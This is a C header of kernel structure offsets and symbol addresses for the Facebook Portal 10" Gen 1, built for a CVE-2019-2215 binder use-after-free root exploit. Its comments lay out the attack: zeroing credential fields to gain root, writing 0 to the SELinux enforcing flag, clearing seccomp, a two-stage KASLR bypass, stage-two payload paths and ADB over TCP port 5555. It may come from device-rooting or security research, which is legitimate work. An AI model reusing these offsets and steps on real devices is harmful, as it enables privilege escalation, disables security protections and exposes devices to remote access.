/*
 * portal_offsets.h — Kernel structure offsets for Facebook Portal 10" Gen 1 (aloha)
 *
 * Device: Portal 10" Gen 1 (2018), codename aloha/ohana
 * SoC: APQ8098 (Snapdragon 835)
 * Kernel: 4.4.153 (Android 9, security patch 2019-08-01)
 * Build: aloha_prod-user PKQ1.191202.001
 *
 * Extracted from: boot.img kallsyms + kernel binary disassembly
 * Date: 2026-03-03
 *
 * WARNING: All kernel addresses are PRE-KASLR. At runtime, add the KASLR slide
 * to all addresses. KASLR slide must be determined dynamically (see KASLR section).
 */

#ifndef PORTAL_OFFSETS_H
#define PORTAL_OFFSETS_H

/* =========================================================================
 * Binder thread structure (for CVE-2019-2215 UAF)
 * ========================================================================= */

/* Size of binder_thread structure — determines which kmalloc slab it uses */
#define BINDER_THREAD_SZ        0x198   /* 408 bytes → kmalloc-512 bucket */

/* Number of iovecs to allocate for slab reclaim (must match slab size) */
#define IOVEC_ARRAY_SZ          32      /* 32 * sizeof(struct iovec) = 32 * 16 = 512 bytes */

/* Offset of wait_queue_head_t within binder_thread
 * This is the field referenced by epoll after binder_thread is freed.
 * Found by disassembling binder_wakeup_thread_ilocked (0xffffff8008d37838):
 *   loads thread + WAITQUEUE_OFFSET for wake_up_interruptible() call */
#define WAITQUEUE_OFFSET        0xA0

/* =========================================================================
 * task_struct offsets (kernel 4.4.153 ARM64)
 * ========================================================================= */

/* thread_info is embedded at the base of task_struct on ARM64 4.4
 * addr_limit is the second field (after flags) */
#define OFFSET_ADDR_LIMIT       0x08    /* thread_info.addr_limit — set to ~0UL for kernel R/W */

/* PID for identifying our own task_struct from leaked pointer */
#define OFFSET_PID              0x5F8   /* task->pid */

/* Credentials — zero these fields to become root */
#define OFFSET_REAL_CRED        0x7B0   /* task->real_cred (pointer to struct cred) */
#define OFFSET_CRED             0x7B8   /* task->cred (pointer to struct cred) */

/* SECCOMP — must be disabled to allow arbitrary syscalls after root */
#define OFFSET_SECCOMP_MODE     0x850   /* task->seccomp.mode (set to 0) */
#define OFFSET_SECCOMP_FILTER   0x858   /* task->seccomp.filter (set to NULL) */

/* =========================================================================
 * struct cred layout (offsets within cred struct, NOT task_struct)
 * ========================================================================= */

/* uid/gid fields to zero for root (all at start of struct cred) */
#define CRED_OFFSET_UID         0x04    /* cred->uid */
#define CRED_OFFSET_GID         0x08    /* cred->gid */
#define CRED_OFFSET_SUID        0x0C    /* cred->suid */
#define CRED_OFFSET_SGID        0x10    /* cred->sgid */
#define CRED_OFFSET_EUID        0x14    /* cred->euid */
#define CRED_OFFSET_EGID        0x18    /* cred->egid */
#define CRED_OFFSET_FSUID       0x1C    /* cred->fsuid */
#define CRED_OFFSET_FSGID       0x20    /* cred->fsgid */

/* Capabilities — set to full for unrestricted root */
#define CRED_OFFSET_CAP_INH     0x28    /* cred->cap_inheritable */
#define CRED_OFFSET_CAP_PRM     0x30    /* cred->cap_permitted */
#define CRED_OFFSET_CAP_EFF     0x38    /* cred->cap_effective */
#define CRED_OFFSET_CAP_BST     0x40    /* cred->cap_bset */
#define CRED_OFFSET_CAP_AMB     0x48    /* cred->cap_ambient */

/* Security context (SELinux) */
#define CRED_OFFSET_SECURITY    0x78    /* cred->security (SELinux context pointer) */

/* Full capabilities value (all 38 bits set) */
#define FULL_CAPABILITIES       0x3ffffffffful

/* =========================================================================
 * Kernel symbols (PRE-KASLR absolute addresses)
 *
 * At runtime: actual_addr = symbol_addr + kaslr_slide
 * where kaslr_slide = actual_kernel_base - KERNEL_BASE
 * ========================================================================= */

/* Kernel base address (start of .text segment) */
#define KERNEL_BASE             0xffffff8008080000ul

/* SELinux enforcement flag — write 0 to disable SELinux */
#define SELINUX_ENFORCING       0xffffff800a925a94ul

/* Credential manipulation functions (for alternative exploit strategies) */
#define COMMIT_CREDS            0xffffff80080cdddcul
#define PREPARE_KERNEL_CRED     0xffffff80080ce2c4ul

/* Binder functions (for reference / debugging) */
#define BINDER_THREAD_RELEASE   0xffffff8008d3b15cul
#define BINDER_WAKEUP_ILOCKED   0xffffff8008d37838ul

/* =========================================================================
 * KASLR configuration
 *
 * CONFIG_RANDOMIZE_BASE=y is CONFIRMED for this kernel.
 * The kernel base is randomized at each boot.
 *
 * Strategy: Double-UAF approach
 *   1. First UAF: Reclaim binder_thread with iovec, leak a kernel pointer
 *      from the freed binder_thread (e.g., task pointer or list pointers)
 *   2. Calculate KASLR slide: leaked_ptr - expected_pre_kaslr_ptr
 *   3. Adjust all kernel addresses: addr += kaslr_slide
 *   4. Second UAF: Perform the actual privilege escalation
 *
 * Alternative: /proc/self/pagemap may leak kernel page frame numbers
 * if not restricted (check /proc/sys/kernel/kptr_restrict value)
 * ========================================================================= */

#define KASLR_ENABLED           1

/* ARM64 KASLR alignment — slide is a multiple of this */
#define KASLR_ALIGNMENT         0x200000ul  /* 2MB alignment typical for ARM64 */

/* =========================================================================
 * Kernel security features (for reference)
 * ========================================================================= */

/* CONFIG_DEBUG_LIST:       NOT enabled (no list_add/list_del validation) ✓ */
/* CONFIG_KPTI:             ENABLED (kernel page table isolation) */
/* CONFIG_ARM64_PAN:        SOFTWARE emulated (no hardware PAN on SD835) */
/* CONFIG_CC_STACKPROTECTOR_STRONG: ENABLED */
/* CONFIG_HARDENED_USERCOPY: ENABLED */
/* CONFIG_SECCOMP:          ENABLED (must zero task->seccomp.mode) */

/* =========================================================================
 * Android-specific constants
 * ========================================================================= */

/* Binder device path */
#define BINDER_DEVICE           "/dev/binder"

/* Temp directory for payload staging */
#define PAYLOAD_DIR             "/data/local/tmp"
#define STAGE2_PATH             "/data/local/tmp/stage2"
#define MARKER_PATH             "/data/local/tmp/ROOTED"

/* ADB configuration properties */
#define ADB_USB_CONFIG          "persist.sys.usb.config"
#define ADB_TCP_PORT_PROP       "service.adb.tcp.port"
#define ADB_TCP_PORT            5555

#endif /* PORTAL_OFFSETS_H */
